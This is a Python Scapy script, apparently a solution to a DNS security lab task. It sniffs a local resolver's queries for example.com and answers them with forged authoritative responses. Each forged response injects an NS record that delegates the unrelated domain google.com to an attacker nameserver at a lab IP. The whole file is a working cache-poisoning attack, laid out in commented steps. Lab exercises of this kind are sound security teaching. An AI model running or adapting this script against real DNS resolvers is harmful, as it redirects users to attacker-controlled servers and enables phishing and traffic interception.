#!/usr/bin/env python3
from scapy.all import *

# ----------------- CONFIG -----------------
LOCAL_DNS_IP = "10.9.0.53"      # Target: Local DNS server
IFACE = "br-8eecaee5cc49"       # Network interface (UPDATE THIS!)

# The domain being ACTUALLY queried
TARGET_DOMAIN = "example.com"

# The UNRELATED domain we want to poison
OTHER_DOMAIN = "google.com"

# Attacker's nameserver info
FAKE_NS = "ns.attacker32.com."   # Fake nameserver
FAKE_NS_IP = "10.9.0.153"        # IP of attacker's nameserver
# ------------------------------------------

def spoof_cross_domain(pkt):
    """
    Intercept DNS queries for example.com, but inject NS record for google.com
    """
    # STEP 1: Check if packet is a DNS query
    if DNS in pkt and pkt[DNS].qd is not None and pkt[DNS].qr == 0:
        
        # STEP 2: Extract query information
        qname = pkt[DNS].qd.qname.decode('utf-8')
        src_ip = pkt[IP].src
        
        # STEP 3: Filter for our target
        # Only handle queries: 1) FROM local DNS, 2) FOR example.com
        if src_ip == LOCAL_DNS_IP and TARGET_DOMAIN in qname:
            print(f"[+] Intercepted DNS query for {qname.strip()}")
            print(f"    Query was for: {TARGET_DOMAIN}")
            print(f"    Will poison: {OTHER_DOMAIN}")
            
            # STEP 4: Create spoofed IP layer
            # Pretend to be the external DNS server that was queried
            ip = IP(src=pkt[IP].dst,   # Original destination (external DNS)
                    dst=pkt[IP].src)   # Original source (local DNS)
            
            # STEP 5: Create spoofed UDP layer
            # DNS server responds from port 53
            udp = UDP(sport=53,                    # DNS server port
                      dport=pkt[UDP].sport)        # Local DNS's source port
            
            # STEP 6: Create Answer section (required for any DNS response)
            # Even though we're poisoning NS records, we need SOME answer
            Anssec = DNSRR(
                rrname=qname,           # Original query (e.g., www.example.com)
                type='A',               # Address record
                ttl=259200,             # 3 days TTL
                rdata='1.2.3.4'         # Some fake IP
            )
            
            # STEP 7: Create Authority section with CROSS-DOMAIN NS record
            # THIS IS THE KEY PART OF TASK 4:
            # We're injecting NS record for google.com, not example.com!
            NSsec = DNSRR(
                rrname=OTHER_DOMAIN + ".",  # The UNRELATED domain
                type='NS',                   # Nameserver record
                ttl=259200,                  # 3 days TTL
                rdata=FAKE_NS                # Point to attacker's nameserver
            )
            
            # STEP 8: Create Additional section
            # Provide IP address for the attacker's nameserver
            Addsec = DNSRR(
                rrname=FAKE_NS,              # Attacker's nameserver
                type='A',                    # Address record
                ttl=259200,                  # 3 days TTL
                rdata=FAKE_NS_IP             # IP: 10.9.0.153
            )
            
            # STEP 9: Construct DNS response packet
            dns = DNS(
                id=pkt[DNS].id,     # CRITICAL: Match query's transaction ID
                qr=1,               # This is a response
                aa=1,               # Authoritative answer
                qd=pkt[DNS].qd,     # Copy original query
                an=Anssec,          # Answer section (required)
                ns=NSsec,           # Authority section (poisoning google.com)
                ar=Addsec,          # Additional section
                qdcount=1,          # One question
                ancount=1,          # One answer
                nscount=1,          # One NS record
                arcount=1           # One additional record
            )
            
            # STEP 10: Assemble and send spoofed packet
            spoofpkt = ip / udp / dns
            
            print(f"[+] Sending cross-domain spoofed response:")
            print(f"    Query: {qname.strip()}")
            print(f"    Poisoning: {OTHER_DOMAIN} → {FAKE_NS}")
            print(f"    Nameserver IP: {FAKE_NS_IP}")
            
            send(spoofpkt, iface=IFACE, verbose=0)


def main():
    # Filter: Capture DNS queries from local DNS server
    myFilter = f"udp port 53 and src host {LOCAL_DNS_IP}"
    
    print(f"[*] Starting Task 4: Cross-domain NS Poisoning")
    print(f"[*] Sniffing on: {IFACE}")
    print(f"[*] Filter: {myFilter}")
    print(f"[*] Will poison {OTHER_DOMAIN} when {TARGET_DOMAIN} is queried")
    print("[*] Waiting for DNS queries...")
    
    # Start packet capture
    sniff(iface=IFACE, filter=myFilter, prn=spoof_cross_domain, store=0)


if __name__ == "__main__":
    main()
